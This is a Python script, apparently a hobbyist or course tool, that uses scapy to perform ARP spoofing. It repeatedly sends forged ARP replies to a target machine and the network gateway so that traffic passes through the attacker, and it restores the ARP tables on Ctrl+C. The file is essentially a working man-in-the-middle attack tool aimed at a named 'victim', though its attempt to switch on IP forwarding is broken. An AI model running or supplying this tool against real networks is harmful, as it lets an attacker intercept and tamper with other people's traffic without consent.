#!/usr/bin/env
import scapy.all as scapy
import argparse
import time
import subprocess
import sys

def get_mac(dest_ip):
    arp_request = scapy.ARP(pdst=dest_ip)
    broadcast_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast_packet = broadcast_request / arp_request
    answered_packets = scapy.srp(arp_request_broadcast_packet, timeout=1, verbose=False)[0]
    try:
        return answered_packets[0][1].hwsrc
    except IndexError:
        print("[-] Host " + str(dest_ip) + " is not up, or that IP does not exist on current subnet")
        sys.exit(0)

"""
:param target_ip: the IP address of the victim you are posing at the router to
:param source_ip: the IP address you are impersonating
"""

def spoof_arp(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
    scapy.send(arp_response_packet, verbose=False)



def restore_arp(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response_packet, verbose=False)



def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="the IP address of the target machine")
    parser.add_argument("-s", "--source", dest="source_ip", help="the IP address of the network gateway "
                                                            "you are impersonating")
    arguments = parser.parse_args()
    if not arguments.target_ip:
        parser.error("[-] please specify a target IP address")
    elif not arguments.source_ip:
        parser.error("[-] please specify a source IP address")
    else:
        return arguments


def execute():
    arguments = get_arguments()
    target_mac = get_mac(arguments.target_ip)
    source_mac = get_mac(arguments.source_ip)
    subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
    packet_count = 0

    print("\n")
    print("               " + "\t\t" + "IP address  " + "\t" + "MAC address")
    print("\n")
    print("Current target:" + "\t\t" + str(arguments.target_ip) + "\t" + str(target_mac))
    print("Current source:" + "\t\t" + str(arguments.source_ip) + "\t" + str(source_mac))

    print("\n")
    while True:
        try:
            spoof_arp(arguments.target_ip, arguments.source_ip)
            spoof_arp(arguments.source_ip, arguments.target_ip)
            time.sleep(2)
            print("\r[+] Packets sent: " + str(packet_count), end="")
            packet_count += 2
        except KeyboardInterrupt:
            restore_arp(arguments.target_ip, arguments.source_ip)
            restore_arp(arguments.source_ip, arguments.target_ip)
            print("[+] CTRL + C detected, exiting and restoring ARP configuration")
            sys.exit(0)



execute()

#things to add:
#restore arp
#IP range
#exception handling for ips outside of subnet
#graceful exit